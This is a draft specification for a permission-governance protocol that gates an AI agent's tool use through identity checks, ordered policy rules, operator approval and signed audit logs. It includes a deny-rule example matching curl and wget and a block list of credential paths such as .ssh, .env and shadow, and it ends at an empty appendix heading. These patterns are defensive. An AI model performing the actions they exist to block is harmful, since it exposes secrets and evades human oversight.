# Atlas Protocol Specification

**Version:** 0.8.4-draft
**Status:** Working Draft
**Authors:** TJ Lane (Corpus Sanctum)
**Last updated:** 2026-03-29

This document defines the normative requirements for Atlas Protocol. It separates **what a conformant implementation MUST do** from **how the reference implementation happens to do it**. The reference implementation (this repository) uses Telegram, Ollama, and MCP as its transport and runtime, but those are binding choices of this implementation, not of the protocol.

Key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" follow [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119).

---

## 1. Overview

Atlas Protocol is a fail-closed permission governance protocol for autonomous AI agents. It defines:

- **Agent identity** — DID-based credentials signed with post-quantum cryptography
- **Policy evaluation** — ordered rule matching with anomaly detection
- **Permission relay** — operator-in-the-loop approval for ambiguous requests
- **Audit integrity** — tamper-evident, anti-truncation, post-quantum signed audit trail
- **Behavioral baselines** — longitudinal drift detection across sessions
- **Delegation** — scoped, depth-limited credential delegation with authority binding

The protocol does NOT prescribe:

- Which messaging system delivers operator prompts (Telegram, Slack, email, local console)
- Which inference runtime powers the Why Layer (Ollama, vLLM, API)
- Which plugin framework hosts the gatekeeper (MCP, LSP, custom)
- Which storage backend persists credentials (JSON files, database, HSM)

## 2. Conformance profiles

| Profile | Intended use | Bootstrap confirmation | Break-glass | Quiet mode | Why Layer | Baseline drift |
|---|---|---|---|---|---|---|
| **Development** | Local testing, CI | MAY skip | MAY omit | MAY enable freely | MAY disable | MAY omit |
| **Production** | Deployed agent governance | MUST require | SHOULD support | SHOULD restrict to mature agents | SHOULD enable | MUST enable |
| **Research** | Protocol experimentation | MUST require | SHOULD support | MAY enable | MUST enable | MUST enable |

Implementations MUST declare which conformance profile they target. The reference implementation defaults to Production.

## 3. Core protocol

### 3.1 Fail-closed default

An implementation MUST deny any request that cannot be resolved through the permission pipeline. Specifically:

- If identity attestation fails, the request MUST be denied.
- If no policy rule matches, the request MUST be forwarded to the operator (not auto-allowed).
- If the operator does not respond within the configured timeout, the request MUST be denied.
- If the relay transport is unreachable and no break-glass token is active, the request MUST be denied.

### 3.2 Permission pipeline

Every tool request MUST pass through these stages in order:

1. **Identity attestation** — verify the requesting agent holds a valid, unexpired, unrevoked credential with the required capability.
2. **Policy evaluation** — match the request against the ordered rule set. First match wins.
3. **Quiet mode** (OPTIONAL) — if enabled, auto-approve eligible low-risk requests for mature agents.
4. **Break-glass** (OPTIONAL) — if an active token exists, auto-approve "ask" verdicts.
5. **Operator relay** — forward unresolved "ask" verdicts to the operator and await response.

Hard-deny rules (step 2) MUST NOT be bypassed by quiet mode, break-glass, or any other mechanism. Only "ask" verdicts may be auto-resolved by steps 3-4.

### 3.3 Policy engine semantics

- Rules MUST be evaluated in order. First match wins. Evaluation MUST stop at the first matching rule.
- Each rule has a `tool_pattern`, an `action` (deny | ask | allow), an OPTIONAL `reason`, and an OPTIONAL `mitre_id`.
- If no rule matches, the default verdict MUST be "ask".
- Implementations SHOULD tag deny rules with MITRE ATT&CK technique IDs.

### 3.3.1 Policy rule grammar

A `tool_pattern` has one of two forms:

**Tool-only match:**
```
<tool_glob>
```
Matches the tool name only. Example: `Bash`, `Read`, `Write*`.

**Tool + input match:**
```
<tool_glob>(<input_glob>|<input_glob>|...)
```
Matches if the tool name matches `<tool_glob>` AND the input preview matches any `<input_glob>` alternative. Example: `Bash(*curl*|*wget*)`.

**Wildcard syntax:**

| Pattern | Meaning |
|---|---|
| `*` | Matches zero or more characters (equivalent to regex `.*`) |
| All other characters | Literal match |

- Regular expressions are NOT permitted in `tool_pattern`. Only `*` wildcards.
- The special characters `. + ^ $ { } ( ) | [ ] \` are treated as literals (escaped before regex conversion).
- The `*` character is the ONLY wildcard. `?`, `[a-z]`, `{a,b}` are literals.

**Matching rules:**

| Property | Requirement |
|---|---|
| **Case sensitivity** | Pattern matching MUST be case-insensitive for both tool name and input preview. |
| **Tool vs input** | Tool name and input preview are matched independently — the tool glob matches against `tool_name`, input globs match against `input_preview`. |
| **Alternatives** | Multiple input patterns inside parentheses are OR-separated by `\|`. Each alternative is trimmed of whitespace before matching. |
| **Empty input** | If a tool+input pattern is used but the request has an empty `input_preview`, only the `*` glob matches. |
| **Ordering guarantee** | Rules MUST be stored and evaluated in the order they appear in the configuration. Implementations MUST NOT reorder, deduplicate, or optimize rules. |
| **Portability** | Implementations that claim conformance MUST produce the same match result for the reference test fixtures (`tests/policy-fixtures.test.ts`). |

### 3.4 Anomaly detection

The policy engine MUST scan every request for anomaly indicators. At minimum:

- **Velocity** — requests per minute exceeding a configurable threshold.
- **Privilege escalation** — sudo, chmod, chown, passwd patterns.
- **Data exfiltration** — outbound data transfer indicators.
- **Obfuscation** — base64, hex encoding, dynamic execution patterns.
- **PII detection** — SSN, email, phone number patterns.

Anomaly flags MUST be attached to the audit entry and included in operator prompts.

## 4. Agent identity (`did:atlas`)

### 4.1 DID method syntax

```
did:atlas:<uuid>
```

Where `<uuid>` is a RFC 4122 v4 UUID. Example: `did:atlas:550e8400-e29b-41d4-a716-446655440000`.

> **Scope constraint:** `did:atlas` as defined in this specification is a **local, single-operator DID method**. It does not define federated namespace resolution, inter-operator trust exchange, or a public resolution network. Cross-operator use cases will require a future DID method version with new syntax and resolution semantics. Implementations MUST NOT advertise `did:atlas` identifiers as globally resolvable.

### 4.2 DID document

A `did:atlas` identifier resolves to an `AgentCredential` object within the **local** identity registry of the issuing gatekeeper. There is no external resolution endpoint. `did:atlas` is a locally-scoped method designed for single-operator environments — it assumes a single gatekeeper is the sole issuer, verifier, and registry operator.

**Canonical DID Document structure:**

```json
{
  "@context": "https://www.w3.org/ns/did/v1",
  "id": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
  "verificationMethod": [{
    "id": "did:atlas:550e8400...#key-1",
    "type": "PostQuantum2024",
    "controller": "did:atlas:550e8400...",
    "publicKeyHex": "<ML-DSA-65 public key>"
  }],
  "authentication": ["did:atlas:550e8400...#key-1"],
  "assertionMethod": ["did:atlas:550e8400...#key-1"]
}
```

### 4.3 Resolution semantics

| Operation | Behavior |
|---|---|
| **Create** | `register()` generates a new keypair, assigns a DID, and stores the credential. The issuer MUST sign the canonical credential payload with its ML-DSA-65 key. |
| **Read** | `get(agentId)` returns the credential object or `null` if not found. Resolution MUST be O(1). |
| **Update** | Credentials are immutable after issuance. To change capabilities or role, revoke and re-issue. |
| **Deactivate** | `revoke(agentId, reason)` sets `revoked: true` and records `revokedAt` + `revokedReason`. A revoked credential MUST fail attestation. Revocation is permanent and irreversible. |

### 4.4 Error states

| State | Resolution result |
|---|---|
| DID not found in registry | `null` (attestation returns `UNREGISTERED_AGENT`) |
| Credential expired | Attestation returns `CREDENTIAL_EXPIRED` |
| Credential revoked | Attestation returns `CREDENTIAL_REVOKED` |
| Capability mismatch | Attestation returns `CAPABILITY_MISMATCH` |
| Registry empty (bootstrap) | Attestation returns unverified pass (bootstrap guard) |

### 4.5 Issuer key discovery and rotation

The gatekeeper's ML-DSA-65 keypair serves as the sole trusted issuer. The public key hash is logged in the `SESSION_START` audit entry for key pinning.

**Issuer key discovery:**

A verifier that does not have the issuer public key pinned locally MUST discover it through one of the following mechanisms, in priority order:

1. **Local pinning** (RECOMMENDED) — the verifier has a pre-shared copy of the issuer's public key or its SHA3-256 hash, obtained through an out-of-band trust establishment (e.g., manual exchange, secure configuration).
2. **SESSION_START extraction** — the verifier reads the most recent `SESSION_START` entry in the audit trail and extracts the `pq_public_key_hash` field from its `meta` object. The verifier SHOULD compare this hash against a separately obtained reference value before trusting it. A `SESSION_START` entry whose `pq_public_key_hash` cannot be independently corroborated MUST be treated as untrusted.
3. **Well-known URI** (future) — a future version of this specification will define a `/.well-known/atlas-issuer` endpoint for publishing the issuer public key and rotation history. Implementations MAY implement this endpoint ahead of formal specification.

For single-operator deployments (the gatekeeper is the only verifier), mechanism 1 is implicit — the gatekeeper holds the key. For multi-party verification (hospital auditor, grant reviewer, VA system), mechanism 1 or 3 is REQUIRED; mechanism 2 alone is insufficient because a compromised gatekeeper could forge `SESSION_START` entries.

**Key rotation procedure:**

1. Generate a new ML-DSA-65 keypair.
2. Log a `KEY_ROTATION` audit entry (signed by the OLD key) with the schema below.
3. Re-issue all active credentials signed by the new key.
4. Archive the old keypair (retain for verification of historical audit entries).
5. The new `SESSION_START` entry pins the new key hash.

**`KEY_ROTATION` audit entry schema:**

The `KEY_ROTATION` event MUST be signed by the **old** key (proving the holder of the old key authorized the rotation). The `meta` object MUST contain:

| Field | Type | Description |
|---|---|---|
| `old_key_hash` | string | SHA3-256 hash of the old public key |
| `new_key_hash` | string | SHA3-256 hash of the new public key |
| `new_public_key_b64` | string | Base64-encoded new public key (for verifiers) |
| `effective_at` | string | ISO 8601 timestamp when the new key becomes active |
| `reason` | string | Human-readable rotation reason (e.g., "scheduled rotation", "key compromise") |
| `credentials_reissued` | number | Count of active credentials re-issued with the new key |
| `reissue_success` | boolean | `true` if all active credentials were successfully re-issued |

**Historical verification:**

- Verifiers MUST retain old public keys to verify audit entries signed before the rotation.
- Implementations SHOULD retain at least the 3 most recent public keys.
- Entries before the `KEY_ROTATION` event are verified against the old key; entries after are verified against the new key. The `KEY_ROTATION` entry itself is verified against the old key.
- If a verifier encounters an entry whose `pq_signature` fails against both the current and retained old keys, it MUST report `PQ_SIGNATURE_INVALID`.

> **Note:** The reference implementation does not yet implement automated key rotation or well-known URI publication. These are specified for forward compatibility.

### 4.6 Bootstrap guard

**"Registry empty" definition:** The registry is empty when `credentials.size === 0` — no credential has ever been registered in this gatekeeper instance. This is distinct from "all credentials expired" or "all credentials revoked" (neither of which reactivates bootstrap mode).

When the registry is empty, attestation MUST return an unverified pass (with `identityVerified: false`) to avoid a catch-22.

**Bootstrap window constraints:**

- Only the **first** credential registration is allowed without attestation. Once any credential exists (even if later revoked/expired), the bootstrap window closes permanently.
- The first credential SHOULD have the `admin` role or include the `identity:register` capability. Implementations MAY enforce this as a MUST.
- Implementations MUST NOT allow more than one unattested registration. If a second registration is attempted before the first completes, it MUST be rejected.

**Two-channel confirmation (Production + Research):**

For **Production** and **Research** conformance, the first credential registration MUST require two-channel confirmation:

1. The gatekeeper generates a cryptographically random confirmation code (minimum 6 hex characters, sourced from a CSPRNG).
2. The code is displayed on the host console (requires physical or SSH access).
3. The code is sent as a challenge to the operator relay.
4. The operator MUST reply with the exact code via the relay within the confirmation timeout.
5. If the code matches, registration proceeds. Otherwise, registration is denied.

| Property | Requirement |
|---|---|
| **Code entropy** | Minimum 24 bits (6 hex characters). MUST use `crypto.randomBytes` or equivalent CSPRNG. |
| **Timeout** | Default 120 seconds. Configurable. MUST NOT exceed 300 seconds. |
| **Replay protection** | Each code MUST be single-use. A used code MUST NOT be accepted again. |
| **Maximum attempts** | After 3 failed confirmation attempts, the gatekeeper MUST lock bootstrap for 10 minutes. |
| **Case sensitivity** | Code comparison MUST be case-insensitive. |

For **Development** conformance, two-channel confirmation MAY be skipped (via `ATLAS_BOOTSTRAP_SKIP_CONFIRM=true`). When skipped, a `BOOTSTRAP_CONFIRM_SKIPPED` event MUST be logged.

## 5. Credential delegation

### 5.1 Delegation constraints

- Child capabilities MUST be a strict subset of the parent's capabilities.
- Child TTL MUST NOT exceed the parent's remaining lifetime.
- Maximum delegation depth MUST NOT exceed 3.
- Delegation from a revoked or expired parent MUST fail.

### 5.2 Chain signature (authority binding)

The delegation chain signature MUST bind the actual delegated authority, not just identities. The signed payload MUST be a canonical JSON object containing:

```json
{
  "protocol": "atlas-protocol",
  "version": "<protocol version>",
  "type": "delegation-authority",
  "rootId": "<root DID>",
  "parentId": "<parent DID>",
  "childId": "<child DID>",
  "capabilities": ["<sorted capability list>"],
  "expiresAt": "<ISO 8601>",
  "depth": <integer>,
  "childCredentialHash": "<SHA3-256 of child credential canonical payload>"
}
```

The parent agent's ML-DSA-65 secret key signs this object. The gatekeeper's issuer key co-signs the full credential.

This prevents substitution attacks where an attacker replays a chain signature with different capabilities or expiry.

### 5.3 Cascade revocation

Revoking a parent credential MUST revoke all descendants. Implementations MUST walk the delegation tree depth-first and revoke every child.

**Atomicity requirement:** Cascade revocation MUST be atomic. Either all descendants are revoked or none are. Partial cascade states (parent revoked, some descendants still active) are invalid.

- If a failure occurs mid-cascade (I/O error, crash), the implementation MUST either roll back all revocations performed so far, or mark the cascade as failed and retry on next startup.
- A verifier MUST NOT observe a revoked parent with any active (non-revoked) descendants unless the system is in an explicit failed/uncommitted cascade state.
- The audit trail MUST record a `CASCADE_REVOCATION` event containing the full set of revoked agent IDs. If the cascade fails, a `CASCADE_REVOCATION_FAILED` event MUST be recorded with the partial set and the failure reason.
- On recovery from a failed cascade, implementations MUST re-attempt revocation of any descendants that remain active.

### 5.4 Verification

Verifying a delegated credential MUST:

1. Verify the credential's issuer signature (gatekeeper key).
2. Verify the credential hash (SHA3-256 of canonical payload).
3. Verify the chain signature against the parent's public key and the canonical delegation authority.
4. Verify the parent is not revoked or expired.
5. If the parent is itself delegated, recursively verify its chain.

## 6. Audit log

### 6.1 Format

The audit log MUST be append-only JSONL (one JSON object per line).

### 6.2 Integrity layers

Implementations MUST provide at minimum:

1. **Hash chaining** — each entry MUST include `prev_hash`, the SHA3-256 hash of the previous line. The first entry uses `"GENESIS"`.
2. **Sequence numbers** — each entry MUST include `seq`, a **global monotonic** 0-indexed integer. See §6.2.1 for exact semantics.

Implementations SHOULD provide:

3. **Post-quantum signatures** — ML-DSA-65 (FIPS 204) signature per entry in `pq_signature`.

Implementations MAY provide:

4. **HMAC-SHA256 signatures** — classical `hmac` field for backwards compatibility.
5. **External anchoring** — publishing checkpoint hashes to a transparency log or blockchain.

### 6.2.1 Sequence number semantics

The `seq` field is a **global monotonic counter** that spans the entire audit trail lifetime, including across file rotations. It MUST NOT reset on rotation.

| Property | Requirement |
|---|---|
| **Starting value** | `seq` MUST start at `0` for the first entry ever written by this gatekeeper instance. |
| **Increment** | Each subsequent entry MUST have `seq` equal to the previous entry's `seq + 1`. No gaps. No duplicates. |
| **Scope** | Global across all files. After rotation, the new file's first entry MUST continue the sequence from the prior file's last `seq + 1`. |
| **Concurrency** | A single gatekeeper process MUST be the sole writer. If two writers race, the audit log is considered corrupt. Implementations MUST NOT support concurrent writers. |
| **Gap semantics** | A verifier that encounters `seq` values `[0, 1, 2, 5, 6]` MUST report entries 3 and 4 as missing (potential truncation). |
| **Rotation bridge** | The rotation manifest (§6.5) MUST record `final_seq` (last `seq` in the rotated file) and `next_seq` (expected first `seq` of the new file, equal to `final_seq + 1`). |

**Verifier failure modes:**

| Condition | Verifier behavior |
|---|---|
| Gap in `seq` | MUST report error: "sequence gap at seq N — entries may be truncated" |
| Duplicate `seq` | MUST report error: "duplicate seq N — log may be corrupted" |
| `seq` not starting at expected value (after rotation) | MUST report error unless manifest confirms the expected starting `seq` |
| Missing `seq` field on an entry | MUST treat as a legacy entry (pre-v0.8.1) and skip sequence validation for that entry only |

### 6.3 Periodic checkpoints

Checkpoints are `CHECKPOINT` audit entries emitted at configurable intervals. Each checkpoint MUST contain:

| Field | Description |
|---|---|
| `checkpoint_seq` | Sequence number of this checkpoint entry |
| `checkpoint_hash` | SHA3-256 hash of the entry at `checkpoint_seq - 1` |
| `entries_since_start` | Equal to `checkpoint_seq + 1` — the total number of entries written to the **current file** (resets to 0 after rotation). This is a local-file counter, not a global counter. Use `seq` for the global count. |
| `pq_signature` | ML-DSA-65 signature of the checkpoint (if signer available) |

**Conformance requirements:**

- **Development:** Checkpoints MAY be disabled.
- **Production:** Checkpoints MUST be enabled. The default interval SHOULD be every 100 entries or 10 minutes, whichever comes first.
- **Research:** Checkpoints MUST be enabled.

When checkpoints are enabled, the verifier MUST detect gaps between expected and actual checkpoint sequences.

### 6.4 Anti-truncation

Hash chaining detects tampering within the chain but not silent truncation (removing entries from the end). Implementations MUST defend against truncation via:

- Monotonic sequence numbers (gap detection).
- Periodic signed checkpoints (when enabled per conformance profile).

Implementations SHOULD additionally consider:

- External checkpoint anchoring (e.g., publishing checkpoint hashes to an append-only third-party log).
- Signed rotation manifests that record the final sequence number and hash of each archived file.

### 6.5 Rotation

When the audit log exceeds a configurable size threshold, implementations SHOULD rotate the file to an archive directory. The rotation manifest MUST record:

| Field | Description |
|---|---|
| `rotated_name` | Filename of the archived file |
| `entry_count` | Number of entries in the rotated file |
| `size_bytes` | File size in bytes |
| `final_hash` | SHA3-256 hash of the last line (chain anchor) |
| `file_hash` | SHA3-256 hash of the entire file content |
| `final_seq` | `seq` value of the last entry in the rotated file |
| `next_seq` | Expected `seq` of the new file's first entry (`final_seq + 1`) |
| `rotated_at` | ISO 8601 timestamp of rotation |

**First entry after rotation:**

The new file's first entry MUST have:
- `prev_hash` equal to the SHA3-256 hash of the rotated file's last line (the `final_hash` from the manifest).
- `seq` equal to `next_seq` from the manifest.

Implementations SHOULD emit a `SESSION_START` or `CHECKPOINT` entry as the first entry of the new file to anchor the chain.

**Cross-archive verification:**

A verifier spanning multiple archived files MUST:
1. Verify each archive independently (hash chain + sequence continuity within the file).
2. Verify the manifest's `final_hash` matches the SHA3-256 of the archive's last line.
3. Verify the manifest's `file_hash` matches the SHA3-256 of the entire archive content.
4. Verify `next_seq` of archive N equals the first `seq` of archive N+1.
5. Verify the `final_hash` of archive N equals the `prev_hash` of the first entry in archive N+1.

**Manifest failure modes:**

| Condition | Verifier behavior |
|---|---|
| Manifest missing | MUST report warning. MAY attempt to reconstruct chain continuity from file contents alone. |
| Manifest `file_hash` mismatch | MUST report error: archive file tampered. |
| Manifest `final_seq`/`next_seq` mismatch | MUST report error: possible truncation between archives. |
| Archive file missing | MUST report error: archive N missing. |

### 6.6 Entry schema

Every audit entry MUST include: `id`, `timestamp`, `event`, `seq`, `prev_hash`.

Every audit entry SHOULD include: `hash_algorithm`, `pq_signature`.

Event-specific fields (`permission`, `policy_result`, `verdict`, `agentId`, `identityVerified`, `mitre`, etc.) are included when applicable.

### 6.7 Field redaction

When privacy mode is enabled or consent tiers require it, sensitive fields on the permission object MUST be replaced with a keyed hash rather than stored in plaintext.

**Redaction construction:**

```
REDACTED:<hmac-sha256(redaction_key, field_value)>
```

- The redaction key MUST be derived from the gatekeeper's HMAC secret (`ATLAS_HMAC_SECRET`). If no HMAC secret is configured, implementations MUST use a randomly generated 256-bit redaction key stored alongside the audit log (at `<data_dir>/redaction-key`, mode 0600).
- The redaction key MUST NOT be the same value as the audit HMAC signing key. If derived from the same secret, a domain separator (e.g., `"atlas-redaction-v1"`) MUST be used.
- The redaction key SHOULD be rotated on the same schedule as the audit HMAC key.
- Cross-entry deterministic comparison IS intended — the same field value in different entries produces the same redacted hash, enabling frequency analysis and join operations without exposing plaintext.

**Why HMAC, not bare SHA-256:** Bare SHA-256 is vulnerable to brute-force reversal on low-entropy values (e.g., SSNs have ~10^9 possibilities, trivially enumerable). HMAC-SHA256 with a secret key makes reversal computationally infeasible regardless of input entropy.

Implementations MUST NOT use bare SHA-256 for redaction of fields that may contain low-entropy sensitive values (SSN, phone, DOB, MRN, short paths).

## 7. Why Layer (Council of Experts)

### 7.1 Design constraints

The Why Layer MUST:

- **Never block the gatekeeper.** If the inference runtime is unavailable, return a nominal stub.
- **Never throw.** Failures are swallowed and logged, not propagated.
- Be non-gating — it informs, it does not decide.

### 7.2 Expert agents

A conformant Why Layer MUST run at least 3 expert perspectives:

- **Anomaly detection** — statistical/behavioral anomalies
- **Intent inference** — what the agent is trying to accomplish
- **Threat narration** — MITRE ATT&CK mapping, incident brief

Experts MAY run in parallel.

### 7.3 Model provenance

Every `WhyAssessment` SHOULD include a `provenance` object containing:

| Field | Description |
|---|---|
| `model` | Model name/tag used for inference |
| `modelDigest` | Model content hash from the runtime (if available) |
| `systemPromptHash` | SHA-256 hash of the system prompts used |
| `ollamaVersion` | Inference runtime version (if available) |
| `protocolVersion` | Atlas Protocol version |

This prevents the CoE from being an unattributed hallucination layer. Consumers of `WhyAssessment` artifacts MUST treat findings as model-generated opinions, not ground truth. The provenance enables reproducibility analysis and version-pinning for compliance.

### 7.4 Evidence citation

Each signal in the `ExpertAssessment.signals` array MUST reference at least one specific audit entry by its `id` field (e.g., `"T1059 match on entry abc12345"`). This grounds the CoE output in observable evidence rather than model confabulation.

**Grounding definition:** A signal is "grounded" if it contains a substring that matches the `id` field (UUID) of at least one audit entry in the analyzed window. An 8+ character prefix match is sufficient (UUIDs are 36 chars; 8 hex chars = 32 bits of uniqueness).

**Minimum evidence requirements:**

| Expert | Minimum grounded signals |
|---|---|
| Anomaly detector | At least 1 grounded signal per finding, or `ungroundedSignals: true` |
| Intent inferencer | At least 2 grounded signals (intent requires a sequence) |
| Threat narrator | At least 1 grounded signal per cited MITRE technique |

Implementations MUST surface a flag when signals cannot be grounded:

```typescript
interface ExpertAssessment {
  // ...
  signals: string[];            // Each SHOULD contain an audit entry ID reference
  ungroundedSignals?: boolean;  // true if any signal lacks an entry citation
}
```

**Confidence downgrade:** When `ungroundedSignals` is `true`, consumers MUST:

- Treat the assessment's `confidence` as no higher than `"low"`, regardless of the model's self-reported confidence.
- Display a visible indicator (e.g., "(ungrounded)") in any UI that surfaces the finding.
- Exclude ungrounded findings from automated escalation decisions.

Research artifacts that contain ungrounded signals MUST NOT be presented as primary evidence without explicit disclosure.

### 7.5 Research artifact integrity

Every `ResearchArtifact` MUST include:

| Field | Description |
|---|---|
| `derivedFrom` | SHA3-256 hash of the serialized audit event window (entry IDs) |
| `generatedBy` | Model identifier from `ModelProvenance` |
| `assessedAt` | ISO 8601 timestamp of artifact generation |
| `caution` | Fixed string: `"AI-generated analysis. Verify against primary audit trail."` |

Research artifacts MUST NOT be presented as primary evidence without corroboration against the audit trail. The `derivedFrom` hash allows a verifier to confirm which audit entries were analyzed.

### 7.6 Evidentiary discipline

Implementations SHOULD:

- Pin model versions in production deployments (not "latest").
- Log when the model used differs from the configured model.
- Include confidence levels on all expert findings.
- Prefer grounded signals over free-text assertions.

## 8. Behavioral baselines

### 8.1 Profile requirements

Each agent MUST accumulate a persistent behavioral profile across sessions. Profiles MUST contain:

- Risk distribution statistics (mean, stddev, percentiles)
- MITRE technique frequency counts
- Per-capability allow/deny/ask ratios
- Temporal activity patterns
- Maturity level classification

### 8.2 Maturity model

| Level | Sessions | Drift detection |
|---|---|---|
| Insufficient | < 10 | No — weak signal |
| Developing | 10-49 | Limited |
| Established | 50-199 | Full |
| Mature | 200+ | Full + eligible for quiet mode |

### 8.3 Drift detection

When the Why Layer fires, implementations MUST check for drift against the agent's baseline. At minimum 5 dimensions:

- Risk score elevation
- New MITRE technique
- Capability deny rate spike
- Temporal anomaly (unusual hours)
- Volume spike

## 9. Break-glass mechanism

### 9.1 Purpose

Provides emergency override when the operator relay transport is unreachable.

### 9.2 Requirements

- Break-glass MUST only bypass "ask" verdicts. Hard-deny rules MUST NOT be bypassed.
- Tokens MUST be time-limited (maximum 4 hours).
- Tokens MUST be stored with restrictive file permissions (0600).
- Activation SHOULD require operator confirmation via the relay transport, falling back to console-only confirmation when the transport is already down.
- All break-glass approvals MUST be logged in the audit trail.
- Implementations MAY support request count limits on tokens.

## 10. Quiet mode

### 10.1 Purpose

Reduces operator noise for mature agents performing low-risk actions.

### 10.2 Invariants

These invariants MUST hold regardless of configuration:

1. Quiet mode MUST only act on "ask" verdicts. It MUST NEVER bypass a "deny" verdict.
2. Quiet mode does NOT create an alternate policy engine — it is a post-policy filter on "ask" results.
3. Sensitivity matching (§3.4, consent boundaries) MUST be evaluated BEFORE quiet eligibility. Any sensitivity match disqualifies.
4. Any anomaly flag (even one) MUST disqualify the request from quiet approval.
5. Any identity uncertainty (`identityVerified: false`) MUST disqualify.
6. Quiet mode MUST be off by default. Explicit opt-in required.

### 10.3 Eligibility

A request is eligible for quiet-mode auto-approval only if ALL of the following are true:

- Quiet mode is enabled (off by default).
- The policy verdict is "ask" (invariant 1).
- The agent's identity is verified (invariant 5).
- The agent's baseline maturity meets the configured threshold (default: mature / 200+ sessions).
- The tool is in the quiet-eligible set (default: read-only tools — `Read`, `Glob`, `Grep`).
- The request has zero anomaly flags (invariant 4).
- The request has zero sensitivity matches (invariant 3).
- The input does not match any sensitive path pattern (§10.4).

**Evaluation order:** The eligibility checks MUST be evaluated in the order listed. Implementations MUST short-circuit on the first failing check (for efficiency and auditability).

### 10.4 Sensitive path patterns

At minimum, implementations MUST block quiet-mode approval for paths matching:

`.env`, `.ssh`, `.gnupg`, `/etc/`, `credentials`, `secret`, `token`, `api_key`, `password`, `shadow`, `.pem`, `.key`, `.p12`, `.pfx`.

Implementations MAY add additional patterns but MUST NOT remove any from this minimum set.

## 11. Forward compatibility

### 11.1 Unknown field handling

**Signed canonical payloads** (credential, delegation authority, audit entries for signing): unknown fields MUST be excluded before hashing or signing, per Appendix D.4. This is the strictest rule — it prevents unsigned structural mutations from being smuggled into signed objects.

**Runtime objects** (credentials in registry, audit entries in logs, baseline profiles): implementations MUST ignore unknown fields when reading, and MUST preserve them when reserializing. This allows newer writers to add fields without breaking older readers.

**Extension fields**: implementations that need custom fields SHOULD place them under an `extensions` object:

```json
{
  "agentId": "did:atlas:...",
  "extensions": {
    "x-myorg-clearance": "TS/SCI",
    "x-myorg-project": "ATLAS-7"
  }
}
```

Fields under `extensions` MUST be ignored by implementations that do not recognize them, and MUST be preserved on reserialization. Fields under `extensions` MUST be excluded from canonical payloads (they are not signed).

### 11.2 Version negotiation

Atlas uses two distinct version identifiers:

| Identifier | Current value | Meaning | Where it appears |
|---|---|---|---|
| **Credential schema version** | `"0.5.0"` | Structure of `AgentCredential` objects. Changes when fields are added/removed from the credential type. | Credential `version` field |
| **Protocol version** | `"0.8.4"` | The overall spec version governing pipeline behavior, audit format, delegation semantics, and conformance requirements. | `SESSION_START` → `meta.version`, delegation authority → `version`, `ModelProvenance.protocolVersion` |

These are independent. A gatekeeper at protocol version 0.8.4 may issue credentials with schema version 0.5.0. The credential schema version changes only when the credential structure changes — it has not changed since v0.5.0.

**Version authority rules:**

- The **gatekeeper's protocol version** (from `SESSION_START → meta.version`) is authoritative for the current session's behavior.
- The **credential schema version** indicates which credential structure was used. A gatekeeper MAY accept credentials from older schema versions if the fields are a subset.
- A gatekeeper MUST NOT accept credentials from a **newer major version** than it implements (e.g., a schema v0.x gatekeeper MUST reject a schema v1.x credential).
- Minor version differences within the same major version MUST be tolerated — newer minor versions add fields but do not remove or redefine existing ones.
- A verifier that encounters an audit entry with an unrecognized `hash_algorithm` MUST report an error rather than silently skip verification.

**Compatibility matrix:**

| Scenario | Behavior |
|---|---|
| Credential version < gatekeeper version (same major) | MUST accept. Older credentials remain valid. |
| Credential version > gatekeeper version (same major) | SHOULD accept if unknown fields are limited to `extensions`. MUST reject if structural fields are unrecognized. |
| Credential major version ≠ gatekeeper major version | MUST reject. |
| Audit entry with unknown `event` type | MUST preserve in log. Verifier MUST validate hash chain but MAY skip event-specific checks. |
| Audit entry with unknown `hash_algorithm` | MUST report verification error. |

## 12. Extensions

### 12.1 DIB Briefcase integration (OPTIONAL)

When a DIB Briefcase is loaded, the policy engine enforces consent boundaries from a 7-tier consent model (Public through Sealed / 42 CFR Part 2). This is an optional privacy hardening layer — Atlas works fully without it.

The Briefcase provides:

- **Consent boundaries** — forbidden tool patterns per consent tier
- **Sensitivity classifications** — regex patterns that detect data types requiring specific consent levels
- **Audit redaction** — fields to hash instead of storing in plaintext

Implementations MAY support other consent/privacy frameworks through the same extension point.

### 12.2 Inference runtime (reference: Ollama)

The reference implementation uses Ollama for the Why Layer's Council of Experts. Implementations MAY use any inference runtime that supports:

- Chat completion with JSON-structured output
- Configurable model selection
- Local-first deployment (recommended for privacy)

### 12.3 Operator relay (reference: Telegram)

The reference implementation uses the Telegram Bot API for operator relay. Implementations MAY use any transport that supports:

- Authenticated message delivery to the operator
- Bi-directional messaging (prompt + verdict)
- Message delivery confirmation

Examples: Slack, Discord, email, SMS, local console, custom webhook.

---

## Appendix A: Cryptographic algorithms

| Purpose | Algorithm | Standard | Notes |
|---|---|---|---|
| Credential signing | ML-DSA-65 | FIPS 204 | Post-quantum, harvest-now-decrypt-later resistant |
| Audit entry signing | ML-DSA-65 | FIPS 204 | Same keypair as credential issuer |
| Hash chaining | SHA3-256 | FIPS 202 | Quantum-resistant hash |
| Credential hash | SHA3-256 | FIPS 202 | Canonical payload digest |
| Audit HMAC (optional) | HMAC-SHA256 | RFC 2104 | Classical, backwards-compatible |
| Field redaction | HMAC-SHA256 | RFC 2104 | Keyed hash for privacy (resists brute-force on low-entropy values) |
| System prompt hash | SHA-256 | FIPS 180-4 | Provenance tracking |

## Appendix B: Reference implementation mapping

| Spec concept | Reference implementation |
|---|---|
| Operator relay | Telegram Bot API (`telegram.ts`) |
| Inference runtime | Ollama (`why-engine.ts`) |
| Plugin framework | MCP (Model Context Protocol) |
| Credential storage | JSON files, chmod 600 |
| Key storage | `quantum-keypair.json`, chmod 600 |
| Audit storage | JSONL files with rotation |
| Baseline storage | Per-agent JSON files |

## Appendix C: MITRE ATT&CK coverage

The reference policy ruleset covers techniques from these ATT&CK tactics:

- Initial Access (T1190, T1195.002)
- Execution (T1059, T1059.004, T1059.006)
- Persistence (T1053.003, T1098.004, T1543, T1546.004)
- Privilege Escalation (T1548, T1548.001)
- Defense Evasion (T1027, T1027.002, T1070, T1140, T1222.002, T1562.001, T1562.004)
- Credential Access (T1003, T1110, T1552, T1555, T1558)
- Discovery (T1018, T1046, T1057, T1082, T1087.002, T1135)
- Lateral Movement (T1021)
- Collection (T1040)
- Command and Control (T1071.001, T1095, T1572, T1573.002)
- Exfiltration (T1048, T1567)
- Impact (T1485, T1489, T1496, T1561)

## Appendix D: Canonical serialization rules

